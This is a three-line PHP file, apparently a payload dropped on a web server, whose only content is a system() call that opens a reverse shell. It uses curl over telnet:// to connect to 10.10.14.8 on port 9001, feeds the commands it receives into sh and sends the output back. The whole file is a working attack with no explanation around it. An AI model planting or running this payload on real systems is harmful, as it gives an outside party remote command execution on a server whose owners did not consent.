<?php
 system("C='curl -Ns telnet://10.10.14.8:9001'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null");
?>
